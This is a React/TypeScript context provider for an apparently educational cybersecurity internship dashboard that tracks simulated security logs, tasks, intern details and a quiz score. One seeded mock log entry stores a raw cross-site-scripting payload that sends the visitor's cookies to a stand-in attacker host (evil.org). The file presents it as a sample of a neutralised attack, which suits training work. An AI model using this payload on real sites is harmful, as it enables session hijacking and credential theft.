import React, { createContext, useContext, useState, useEffect } from 'react';
import { SecurityLog, InternshipTask } from '../types/security';
import { INITIAL_TASKS } from '../data/phishingScenarios';

interface SecurityContextType {
  activeTab: 'overview' | 'auth' | 'input' | 'scanner' | 'logging' | 'simulation' | 'submission';
  setActiveTab: (tab: 'overview' | 'auth' | 'input' | 'scanner' | 'logging' | 'simulation' | 'submission') => void;
  logs: SecurityLog[];
  addLog: (log: Omit<SecurityLog, 'id' | 'timestamp'>) => void;
  clearLogs: () => void;
  tasks: InternshipTask[];
  completeTask: (taskId: string) => void;
  internName: string;
  setInternName: (name: string) => void;
  internId: string;
  setInternId: (id: string) => void;
  internOrg: string;
  setInternOrg: (org: string) => void;
  isSubmissionModalOpen: boolean;
  setIsSubmissionModalOpen: (open: boolean) => void;
  quizScore: number;
  setQuizScore: (score: number) => void;
  quizTotal: number;
}

const SecurityContext = createContext<SecurityContextType | undefined>(undefined);

const INITIAL_LOGS: SecurityLog[] = [
  {
    id: 'log-101',
    timestamp: new Date(Date.now() - 1000 * 60 * 18).toLocaleTimeString(),
    eventType: 'SYSTEM_INITIALIZED',
    severity: 'INFO',
    sourceIp: '127.0.0.1',
    details: 'Security Virtual Internship Defense Lab engine initialized successfully. Threat monitors online.',
    actionTaken: 'SYSTEM_BOOT_NOMINAL'
  },
  {
    id: 'log-102',
    timestamp: new Date(Date.now() - 1000 * 60 * 14).toLocaleTimeString(),
    eventType: 'HEADER_SECURITY_CHECK',
    severity: 'INFO',
    sourceIp: '192.168.1.45',
    details: 'Inspection of Content-Security-Policy (CSP) and X-Frame-Options configured on edge reverse proxy.',
    actionTaken: 'POLICY_ACTIVE'
  },
  {
    id: 'log-103',
    timestamp: new Date(Date.now() - 1000 * 60 * 8).toLocaleTimeString(),
    eventType: 'AUTH_RATE_LIMIT_TRIGGERED',
    severity: 'WARNING',
    sourceIp: '198.51.100.24',
    details: '4 consecutive invalid password attempts detected against service account svc_billing.',
    actionTaken: 'EXPONENTIAL_BACKOFF_APPLIED'
  },
  {
    id: 'log-104',
    timestamp: new Date(Date.now() - 1000 * 60 * 3).toLocaleTimeString(),
    eventType: 'INPUT_XSS_DETECTED',
    severity: 'CRITICAL',
    sourceIp: '203.0.113.89',
    details: 'Reflected script payload neutralized in authentication redirection parameter.',
    actionTaken: 'PAYLOAD_ESCAPED_AND_QUARANTINED',
    rawPayload: '<script>document.location="http://evil.org/steal?cookie="+document.cookie</script>'
  }
];

export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [activeTab, setActiveTab] = useState<'overview' | 'auth' | 'input' | 'scanner' | 'logging' | 'simulation' | 'submission'>('overview');
  const [logs, setLogs] = useState<SecurityLog[]>(INITIAL_LOGS);
  const [tasks, setTasks] = useState<InternshipTask[]>(INITIAL_TASKS);
  const [internName, setInternName] = useState<string>('Ahtesham Tashewale');
  const [internId, setInternId] = useState<string>('SEC-INT-2026-8819');
  const [internOrg, setInternOrg] = useState<string>('Cybersecurity Engineering Track');
  const [isSubmissionModalOpen, setIsSubmissionModalOpen] = useState<boolean>(false);
  const [quizScore, setQuizScore] = useState<number>(0);
  const quizTotal = 5;

  const addLog = (logData: Omit<SecurityLog, 'id' | 'timestamp'>) => {
    const newLog: SecurityLog = {
      ...logData,
      id: `log-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date().toLocaleTimeString()
    };
    setLogs((prev) => [newLog, ...prev.slice(0, 99)]); // Keep last 100 logs
  };

  const clearLogs = () => {
    setLogs([
      {
        id: `log-${Date.now()}`,
        timestamp: new Date().toLocaleTimeString(),
        eventType: 'SYSTEM_INITIALIZED',
        severity: 'INFO',
        sourceIp: '127.0.0.1',
        details: 'Security audit logs cleared by administrator. Audit session reset.',
        actionTaken: 'LOG_PURGE'
      }
    ]);
  };

  const completeTask = (taskId: string) => {
    setTasks((prev) =>
      prev.map((t) => (t.id === taskId ? { ...t, isCompleted: true } : t))
    );
  };

  return (
    <SecurityContext.Provider
      value={{
        activeTab,
        setActiveTab,
        logs,
        addLog,
        clearLogs,
        tasks,
        completeTask,
        internName,
        setInternName,
        internId,
        setInternId,
        internOrg,
        setInternOrg,
        isSubmissionModalOpen,
        setIsSubmissionModalOpen,
        quizScore,
        setQuizScore,
        quizTotal
      }}
    >
      {children}
    </SecurityContext.Provider>
  );
};

export const useSecurity = () => {
  const context = useContext(SecurityContext);
  if (!context) {
    throw new Error('useSecurity must be used within a SecurityProvider');
  }
  return context;
};
